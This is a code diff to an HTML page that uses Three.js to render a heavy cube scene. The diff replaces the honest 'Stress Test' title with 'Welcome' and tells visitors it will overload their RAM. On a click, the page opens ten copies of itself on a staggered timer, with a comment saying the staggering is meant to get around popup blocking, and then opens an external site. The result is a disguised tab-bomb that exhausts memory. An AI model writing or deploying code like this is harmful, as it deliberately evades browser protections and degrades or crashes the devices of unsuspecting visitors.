@@ -25,8 +25,8 @@
 </head>
 <body>
   <div id="ui">
-    <div><strong>🟥 200 Million Cube Stress Test</strong></div>
-    <div id="info">Click anywhere to open 10 tabs to the same local file</div>
+    <div><strong>🟥 Welcome</strong></div>
+    <div id="info">Now we’re going to overload your RAM. Click anywhere to begin.</div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/three@0.158.0/build/three.min.js"></script>
@@ -101,15 +101,21 @@
       renderer.render(scene, camera);
     }
 
-    // Start rendering on page load
     window.onload = start;
 
-    // Open 10 tabs of the same local page on click
+    // Click to open 10 local tabs and 1 external
     document.body.addEventListener("click", () => {
-      const url = window.location.href; // open the same page
+      const url = window.location.href;
+
       for (let i = 0; i < 10; i++) {
-        window.open(url, "_blank");
+        setTimeout(() => {
+          window.open(url, "_blank");
+        }, i * 200); // Staggered to avoid popup blocking
       }
+
+      setTimeout(() => {
+        window.open("https://katana-king.github.io/NAJIBA/", "_blank");
+      }, 2200);
     }, { once: true });
   </script>
 </body>
